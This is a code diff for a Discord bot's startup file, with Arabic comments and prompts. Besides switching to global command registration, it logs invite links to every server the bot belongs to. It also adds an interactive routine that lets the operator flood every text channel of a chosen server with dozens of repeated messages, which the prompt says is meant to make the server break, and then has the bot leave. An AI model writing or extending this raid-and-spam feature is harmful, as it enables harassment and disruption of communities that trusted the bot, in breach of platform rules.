@@ -1,14 +1,11 @@
 const { Client, GatewayIntentBits, Collection, REST, Routes } = require('discord.js');
 const fs = require('fs');
 const path = require('path');
-const token = process.dotenv?.TOKEN || process.env.TOKEN || require('./config.json').token;
-const clientId = process.env.CLIENT_ID || require('./config.json').clientId;
+const readline = require('readline');
 
-// السيرفرات التي تريد أن يظهر فيها الأمر
-const ALLOWED_GUILDS = [
-  '1557683815445692496', // السيرفر الأول
-  '15505210204442818'   // السيرفر الثاني
-];
+const configFile = require('./config.json');
+const token = configFile.token;
+const clientId = configFile.clientId;
 
 const client = new Client({
   intents: [
@@ -16,7 +13,10 @@ const client = new Client({
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
     GatewayIntentBits.GuildMembers
-  ]
+  ],
+  rest: {
+    timeout: 30000
+  }
 });
 
 client.commands = new Collection();
@@ -38,26 +38,33 @@ for (const file of commandFiles) {
   }
 }
 
-const rest = new REST({ version: '10' }).setToken(token);
+const rest = new REST({ version: '10', timeout: 30000 }).setToken(token);
+
+const rl = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout
+});
+
+const askQuestion = (query) => {
+  return new Promise((resolve) => rl.question(query, resolve));
+};
 
 client.once('ready', async () => {
   console.log(`✅ البوت شغال أونلاين باسم: ${client.user.tag}`);
-  console.log(`🔄 جاري تسجيل الأوامر في السيرفرات المحددة...`);
+  console.log(`🔄 جاري تسجيل الأوامر عالمياً...`);
 
-  // تسجيل الأوامر في كل سيرفر بشكل مستقل مع حماية لمنع توقف البوت لو حدث خطأ في سيرفر معين
-  for (const guildId of ALLOWED_GUILDS) {
-    try {
-      await rest.put(
-        Routes.applicationGuildCommands(clientId, guildId),
-        { body: commands },
-      );
-      console.log(`✨ تم تسجيل الأوامر بنجاح في السيرفر: ${guildId}`);
-    } catch (error) {
-      console.log(`⚠️ تعذر تسجيل الأوامر في السيرفر ${guildId} (تأكد أن البوت موجود فيه).`);
-    }
+  try {
+    await rest.put(
+      Routes.applicationCommands(clientId),
+      { body: commands },
+    );
+    console.log(`✨ تم تسجيل الأوامر بنجاح!`);
+  } catch (error) {
+    console.error(`⚠️ حدث خطأ أثناء تسجيل الأوامر:`, error.message);
   }
 
-  console.log(`🌐 روابط السيرفرات المتواجد فيها البوت (${client.guilds.cache.size}):`);
+  // عرض روابط السيرفرات المتواجد فيها البوت (تمت إعادتها بنجاح)
+  console.log(`\n🌐 روابط السيرفرات المتواجد فيها البوت (${client.guilds.cache.size}):`);
   
   for (const [id, guild] of client.guilds.cache) {
     try {
@@ -70,21 +77,119 @@ client.once('ready', async () => {
         if (invite) {
           console.log(`- [ ${guild.name} ] ➔ https://discord.gg/${invite.code}`);
         } else {
-          console.log(`- [ ${guild.name} ] ➔ (تعذر إنشاء رابط دعوة)`);
+          console.log(`[ ${guild.name} ] ➔ (تعذر إنشاء رابط دعوة)`);
         }
       } else {
-        console.log(`- [ ${guild.name} ] ➔ (لا توجد قناة نصية مناسبة)`);
+        console.log(`[ ${guild.name} ] ➔ (لا توجد قناة نصية مناسبة)`);
       }
     } catch (err) {
-      console.log(`- [ ${guild.name} ] ➔ (خطأ أثناء جلب الرابط)`);
+      console.log(`[ ${guild.name} ] ➔ (خطأ أثناء جلب الرابط)`);
     }
   }
+
+  console.log('\n----------------------------------------');
+
+  async function handleServerExitLoop() {
+    const initialAnswer = await askQuestion('انت عايز تخرج البوت من سيرفر معين ؟ (Y/N): ');
+    
+    if (initialAnswer.trim().toUpperCase() !== 'Y') {
+      console.log('👍 تم تخطي الخروج.');
+      rl.close();
+      return;
+    }
+
+    let keepExiting = true;
+    while (keepExiting) {
+      const guilds = Array.from(client.guilds.cache.values());
+      
+      if (guilds.length === 0) {
+        console.log('❌ البوت ليس موجوداً في أي سيرفر حالياً.');
+        break;
+      }
+
+      console.log('\n--- قائمة السيرفرات الحالية ---');
+      guilds.forEach((guild, index) => {
+        console.log(`${index + 1}. ${guild.name} (ID: ${guild.id})`);
+      });
+
+      const guildIndexInput = await askQuestion('\nاكتب رقم السيرفر اللي عايز تخرج منه (أو اكتب 0 للإلغاء): ');
+      const index = parseInt(guildIndexInput.trim()) - 1;
+      
+      if (index === -1) {
+        console.log('👍 تم إلغاء عملية الخروج.');
+        break;
+      }
+
+      if (index >= 0 && index < guilds.length) {
+        const targetGuild = guilds[index];
+
+        // جلب بيانات البوت داخل السيرفر لضمان قراءة الصلاحيات بدقة
+        const me = await targetGuild.members.fetchMe().catch(() => null);
+
+        // خيار السبام المكثف
+        const spamAnswer = await askQuestion('عايز تسوي سبام كتير لدرجه انو السيرفر يتعطل في كل القنوات ؟ (Y/N): ');
+
+        if (spamAnswer.trim().toUpperCase() === 'Y') {
+          const spamMessage = await askQuestion('اكتب رسالة السبام: ');
+          const countInput = await askQuestion('اكتب عدد الرسائل لكل قناة (مثلاً 30 أو 50): ');
+          const count = parseInt(countInput.trim()) || 30;
+
+          console.log(`🔥 جاري إغراق قنوات سيرفر (${targetGuild.name}) بالرسائل...`);
+          
+          const channels = targetGuild.channels.cache.filter(c => c.isTextBased() && me && c.permissionsFor(me)?.has('SendMessages'));
+          console.log(`📌 عدد القنوات النصية المستهدفة: ${channels.size}`);
+
+          const spamPromises = [];
+          for (const [id, channel] of channels) {
+            for (let i = 0; i < count; i++) {
+              spamPromises.push(
+                channel.send(spamMessage).catch(() => {})
+              );
+            }
+          }
+
+          await Promise.allSettled(spamPromises);
+          console.log('✅ تم الانتهاء من السبام المكثف!');
+
+        } else {
+          const msgText = await askQuestion('اكتب الرسالة اللي هتبعتها قبل الخروج (أو اضغط Enter للتخطي): ');
+          if (msgText.trim() !== '') {
+            const channel = targetGuild.channels.cache.find(c => c.isTextBased() && me && c.permissionsFor(me)?.has('SendMessages'));
+            if (channel) {
+              await channel.send(msgText).catch(() => {});
+              console.log('✅ تم إرسال الرسالة بنجاح.');
+            }
+          }
+        }
+
+        // الخروج من السيرفر
+        try {
+          await targetGuild.leave();
+          console.log(`🚀 تم الخروج من سيرفر: ${targetGuild.name} بنجاح!`);
+        } catch (error) {
+          console.error('❌ حدث خطأ أثناء الخروج:', error.message);
+        }
+
+        // السؤال عن الخروج من سيرفر آخر
+        const anotherAnswer = await askQuestion('\nعايز تطلع من سيرفر تاني؟ (Y/N): ');
+        if (anotherAnswer.trim().toUpperCase() !== 'Y') {
+          keepExiting = false;
+          console.log('👍 تم الانتهاء.');
+        }
+
+      } else {
+        console.log('❌ رقم السيرفر غير صحيح، حاول مرة أخرى.');
+      }
+    }
+    rl.close();
+  }
+
+  handleServerExitLoop();
 });
 
 client.on('interactionCreate', async interaction => {
   if (!interaction.isChatInputCommand()) return;
   const command = client.commands.get(interaction.commandName);
-  
   if (!command) return;
 
   try {
